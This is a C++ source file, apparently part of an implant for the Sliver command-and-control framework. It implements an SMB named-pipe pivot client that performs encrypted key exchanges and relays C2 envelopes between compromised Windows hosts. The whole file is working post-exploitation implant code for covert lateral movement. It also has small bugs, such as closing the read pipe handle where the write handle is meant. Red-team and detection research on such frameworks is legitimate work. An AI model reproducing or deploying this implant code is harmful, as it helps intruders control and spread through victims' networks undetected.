#if defined(PIVOT) && defined(SMBPIVOT)
#include "Client.h"
#include "pivots.h"
#include "CryptoUtils.h"
#include "constants.h"
#define BUF_SIZE 32768
using namespace std;

namespace transports {
	NamedPipeClient::NamedPipeClient(const string& _pipe_name) : pipe_name(_pipe_name) {
		this->hPipeRead = INVALID_HANDLE_VALUE;
		this->hPipeWrite = INVALID_HANDLE_VALUE;
	}
	bool NamedPipeClient::SessionInit(string& error) {
		if (this->hPipeRead != INVALID_HANDLE_VALUE) {
			CloseHandle(this->hPipeRead);
			this->hPipeRead = INVALID_HANDLE_VALUE;
		}
		if (this->hPipeWrite != INVALID_HANDLE_VALUE) {
			CloseHandle(this->hPipeRead);
			this->hPipeRead = INVALID_HANDLE_VALUE;
		}
		string tmp = this->pipe_name;
		this->hPipeWrite = CreateFileA(
			tmp.append("_readserver").c_str(),             // pipe name 
			GENERIC_READ |  // read and write access 
			GENERIC_WRITE,       // read/write access 
			0,
			NULL,
			OPEN_EXISTING,
			0,
			NULL);
		if (this->hPipeWrite == INVALID_HANDLE_VALUE)
			return false;
		tmp = this->pipe_name;
		this->hPipeRead = CreateFileA(
			tmp.append("_writeserver").c_str(),             // pipe name 
			GENERIC_READ |  // read and write access 
			GENERIC_WRITE,       // read/write access 
			0,
			NULL,
			OPEN_EXISTING,
			0,
			NULL);
		if (this->hPipeRead == INVALID_HANDLE_VALUE)
			return false;
		DWORD dwMode = PIPE_READMODE_BYTE;
		auto fSuccess = SetNamedPipeHandleState(
			this->hPipeRead,    // pipe handle 
			&dwMode,  // new pipe mode 
			NULL,     // don't set maximum bytes 
			NULL);
		fSuccess = SetNamedPipeHandleState(
			this->hPipeWrite,    // pipe handle 
			&dwMode,  // new pipe mode 
			NULL,     // don't set maximum bytes 
			NULL);
		auto id = pivots::generatePeerID();
		//peer key exchange
		sliverpb::PivotHello req;
		req.set_peerid(id);
		string serialized;
		req.SerializeToString(&serialized);
		if (!this->write(serialized, error))
			return false;
		auto received = this->read(error);
		if (error != "")
			return false;
		sliverpb::PivotHello resp;
		resp.ParseFromString(received);
		this->peer_ctx.SetKey(resp.sessionkey());

		//server key exchange
		auto key = crypto::RandomKey();
		this->server_ctx.SetKey(key);
		auto enc = crypto::ECCEncryptToServer(key);
		sliverpb::PivotServerKeyExchange server_req;
		server_req.set_sessionkey(enc);
		server_req.set_originid(pivots::generatePeerID());
		string server_req_serialized;
		server_req.SerializeToString(&server_req_serialized);
		sliverpb::PivotPeerEnvelope peer_env;
		peer_env.set_type(sliverpb::MsgPivotServerKeyExchange);
		peer_env.set_data(server_req_serialized);
		auto p = peer_env.add_peers();
		p->set_name("PIVOT_PEER");
		p->set_peerid(pivots::getPeerID());
		string serialized_pivotpeerenvelope;
		peer_env.SerializeToString(&serialized_pivotpeerenvelope);
		sliverpb::Envelope serverkeyex_envelope;
		serverkeyex_envelope.set_data(serialized_pivotpeerenvelope);
		serverkeyex_envelope.set_type(sliverpb::MsgPivotPeerEnvelope);
		string final_serialized;
		serverkeyex_envelope.SerializeToString(&final_serialized);
		auto enc2 = this->peer_ctx.Encrypt(final_serialized);
		if (!this->write(enc2, error))
			return false;
		auto resp_from_server = this->ReadEnvelopeBlocking(error);
		if (resp_from_server == nullptr)
			return false;
		sliverpb::PivotServerKeyExchange keyex_resp;
		keyex_resp.ParseFromString(resp_from_server->data());
		this->pivotSessionID = keyex_resp.sessionkey();
		return true;
	}
	string NamedPipeClient::read(string& error) {
		DWORD n = 0;
		DWORD read = 0;
		BOOL res = false;
		res = ReadFile(this->hPipeRead, &n, sizeof(uint32_t), &read, NULL);
		if (!res) {
			error = std::format("ReadFile returned error {}", GetLastError());
			return "";
		}
		string out;
		out.resize(n);
		char* ptr = (char*)out.c_str();
		read = 0;
		while (read < n) {
			if (n - read >= BUF_SIZE) {
				DWORD read_bytes = 0;
				res = ReadFile(this->hPipeRead, (LPVOID)ptr, BUF_SIZE, &read_bytes, NULL);
				if (!res) {
					error = std::format("ReadFile returned error {}", GetLastError());
				}
				ptr += read_bytes;
				read += read_bytes;
			}
			else {
				DWORD read_bytes = 0;
				res = ReadFile(this->hPipeRead, (LPVOID)ptr, n-read, &read_bytes, NULL);
				if (!res) {
					error = std::format("ReadFile returned error {}", GetLastError());
				}
				ptr += read_bytes;
				read += read_bytes;
			}
		}
		return out;
		/*char buf[2048] = { 0 };
		DWORD read_bytes = 0;
		string out;
		out.resize(0);
		while (1) {
			DWORD message_bytes = 0;
			PeekNamedPipe(this->hPipe, NULL, NULL, NULL, NULL, &message_bytes);
			if (message_bytes) {
				auto res = ReadFile(this->hPipe, &buf, 2048, &read_bytes, NULL);
				if (res) {
					out.append(buf, read_bytes);
					break;
				}
				if (!res && GetLastError() == ERROR_MORE_DATA) {
					out.append(buf, read_bytes);
				}
			}
		}
		return out;*/

		/*char buf[2048] = { 0 };
		DWORD read_bytes = 0;
		string out;
		out.resize(0);
		while (1) {
			auto res = ReadFile(this->hPipeRead, &buf, 2048, &read_bytes, NULL);
				if (res) {
					out.append(buf, read_bytes);
					break;
				}
				else if (!res && GetLastError() == ERROR_MORE_DATA) {
					out.append(buf, read_bytes);
				}
				else if (!res && GetLastError() != ERROR_MORE_DATA) {
					throw exception(std::format("ReadFile failed with error {}", GetLastError()).c_str());
				}
		}
		return out;*/
	}
	bool NamedPipeClient::write(const string& in,string& error) {
		auto size = static_cast<uint32_t>(in.size());
		DWORD written = 0;
		BOOL res = false;
		res = WriteFile(this->hPipeWrite, &size, sizeof uint32_t, &written, NULL);
		if (!res) {
			error = std::format("WriteFile returned error {}", GetLastError());
		}
		DWORD tot_written = 0;
		auto buff_ptr = (char*)in.c_str();
		while (tot_written < size) {
			if (size - tot_written >= BUF_SIZE) {
				res = WriteFile(this->hPipeWrite, buff_ptr, BUF_SIZE, &written, NULL);
				if (!res) {
					error = std::format("WriteFile returned error {}", GetLastError());
				}
				tot_written += written;
				buff_ptr += written;
			}
			else {
				res = WriteFile(this->hPipeWrite, buff_ptr, size - tot_written, &written, NULL);
				if (!res) {
					error = std::format("WriteFile returned error {}", GetLastError());
				}
				tot_written += written;
				buff_ptr += written;
			}
		}
		//DWORD written = 0;
		//if (!WriteFile(this->hPipeWrite, in.c_str(), in.size(), &written, NULL) && written == 0) {
		//	//throw exception(std::format("WriteFile failed with error {}", GetLastError()).c_str());
		//	auto size = in.size();
		//	written = 0;
		//	WriteFile(this->hPipeWrite, &size, sizeof size, &written, NULL);
		//	auto chunk_size = 50000;
		//	auto ptr = in.c_str();
		//	size_t tot_written = 0;
		//	while (1) {
		//		if (tot_written == size) {
		//			break;
		//		}
		//		size_t to_write = size - tot_written;
		//		if (to_write > chunk_size)
		//			to_write = chunk_size;
		//		WriteFile(this->hPipeWrite, ptr, to_write, &written, NULL);
		//		tot_written += written;
		//	}
		//}
		return true;
	}
	bool NamedPipeClient::WriteAndReceive(const sliverpb::Envelope& to_send, sliverpb::Envelope& recv,string& error) {
		unique_lock<std::mutex> lk{ pollMutex };
		sliverpb::Envelope env = to_send;
		if (this->WriteEnvelope(env, error)) {
			auto resp = this->ReadEnvelopeBlocking(error);
			if (resp != nullptr) {
				recv = *(resp.get());
				return true;
			}
		}
		return false;
	}
	unique_ptr<sliverpb::Envelope> NamedPipeClient::ReadEnvelopeBlocking(string& error) {
		auto data = this->read(error);
		if (error != "")
			return nullptr;
		auto plain = this->peer_ctx.Decrypt(data);
		unique_ptr<sliverpb::Envelope> incomingEnvelope = make_unique<sliverpb::Envelope>();
		incomingEnvelope->ParseFromString(plain);
		if (incomingEnvelope->type() != sliverpb::MsgPivotPeerEnvelope) {
			return nullptr;
		}
		auto peerEnv = make_unique<sliverpb::PivotPeerEnvelope>();
		peerEnv->ParseFromString(incomingEnvelope->data());
		if (peerEnv->peers()[0].peerid() != pivots::getPeerID()) {
			return incomingEnvelope;
		}
		plain = this->server_ctx.Decrypt(peerEnv->data());
		unique_ptr<sliverpb::Envelope> env = make_unique<sliverpb::Envelope>();
		env->ParseFromString(plain);
		return env;
	}
	unique_ptr<sliverpb::Envelope> NamedPipeClient::ReadEnvelope(string& error) {
		if (!this->Check()) {
			return nullptr;
		}
		auto data = this->read(error);
		if (error != "")
			return nullptr;
		auto plain = this->peer_ctx.Decrypt(data);
		unique_ptr<sliverpb::Envelope> incomingEnvelope = make_unique<sliverpb::Envelope>();
		incomingEnvelope->ParseFromString(plain);
		if (incomingEnvelope->type() != sliverpb::MsgPivotPeerEnvelope) {
			return nullptr;
		}
		auto peerEnv = make_unique<sliverpb::PivotPeerEnvelope>();
		peerEnv->ParseFromString(incomingEnvelope->data());
		if (peerEnv->peers()[0].peerid() != pivots::getPeerID()) {
			return incomingEnvelope;
		}
		plain = this->server_ctx.Decrypt(peerEnv->data());
		unique_ptr<sliverpb::Envelope> env = make_unique<sliverpb::Envelope>();
		env->ParseFromString(plain);
		return env;
	}
	bool NamedPipeClient::Check() {
		DWORD available = 0;
		PeekNamedPipe(this->hPipeRead, NULL, 0, NULL, &available, NULL);
		if (available > 4) {
			return true;
		}
		else {
			return false;
		}
	}
	bool NamedPipeClient::WriteEnvelope_nolock(sliverpb::Envelope& env,string& error) {
		string serialized;
		env.SerializeToString(&serialized);
		string finalSerialized;
		if (env.type() != sliverpb::MsgPivotPeerEnvelope) {
			auto enc = this->server_ctx.Encrypt(serialized);
			sliverpb::PivotPeerEnvelope peerEnv;
			peerEnv.set_pivotsessionid(this->pivotSessionID);
			peerEnv.set_type(sliverpb::MsgPivotSessionEnvelope);
			peerEnv.set_data(enc);
			auto p = peerEnv.add_peers();
			p->set_name("PIVOT_PEER");
			p->set_peerid(pivots::getPeerID());
			string serialized_peerEnv;
			peerEnv.SerializeToString(&serialized_peerEnv);
			sliverpb::Envelope envelope;
			envelope.set_data(serialized_peerEnv);
			envelope.set_type(sliverpb::MsgPivotPeerEnvelope);

			envelope.SerializeToString(&finalSerialized);
		}
		else {
			finalSerialized = serialized;
		}
		auto enc = this->peer_ctx.Encrypt(finalSerialized);
		return this->write(enc,error);
	}


	bool NamedPipeClient::WriteEnvelope(sliverpb::Envelope& env, string& error) {
		string serialized;
		env.SerializeToString(&serialized);
		string finalSerialized;
		if (env.type() != sliverpb::MsgPivotPeerEnvelope && env.type() != sliverpb::MsgPivotPeerEnvelopeNoResponse) {
			auto enc = this->server_ctx.Encrypt(serialized);
			sliverpb::PivotPeerEnvelope peerEnv;
			peerEnv.set_pivotsessionid(this->pivotSessionID);
			peerEnv.set_type(sliverpb::MsgPivotSessionEnvelope);
			peerEnv.set_data(enc);
			auto p = peerEnv.add_peers();
			p->set_name("PIVOT_PEER");
			p->set_peerid(pivots::getPeerID());
			string serialized_peerEnv;
			peerEnv.SerializeToString(&serialized_peerEnv);
			sliverpb::Envelope envelope;
			envelope.set_data(serialized_peerEnv);
			envelope.set_type(sliverpb::MsgPivotPeerEnvelope);
			envelope.SerializeToString(&finalSerialized);
		}
		else {
			finalSerialized = serialized;
		}
		auto enc = this->peer_ctx.Encrypt(finalSerialized);
		return this->write(enc,error);
	}

	bool NamedPipeClient::WriteEnvelopeNoResp(sliverpb::Envelope& env, string& error) {
		unique_lock<std::mutex> lk{ pollMutex };
		string serialized;
		env.SerializeToString(&serialized);
		string finalSerialized;
		if (env.type() != sliverpb::MsgPivotPeerEnvelope && env.type() != sliverpb::MsgPivotPeerEnvelopeNoResponse) {
			auto enc = this->server_ctx.Encrypt(serialized);
			sliverpb::PivotPeerEnvelope peerEnv;
			peerEnv.set_pivotsessionid(this->pivotSessionID);
			peerEnv.set_type(sliverpb::MsgPivotSessionEnvelope);
			peerEnv.set_data(enc);
			auto p = peerEnv.add_peers();
			p->set_name("PIVOT_PEER");
			p->set_peerid(pivots::getPeerID());
			string serialized_peerEnv;
			peerEnv.SerializeToString(&serialized_peerEnv);
			sliverpb::Envelope envelope;
			envelope.set_data(serialized_peerEnv);
			envelope.set_type(sliverpb::MsgPivotPeerEnvelopeNoResponse);
			envelope.SerializeToString(&finalSerialized);
		}
		else {
			finalSerialized = serialized;
		}
		auto enc = this->peer_ctx.Encrypt(finalSerialized);
		return this->write(enc,error);
	}
}

#endif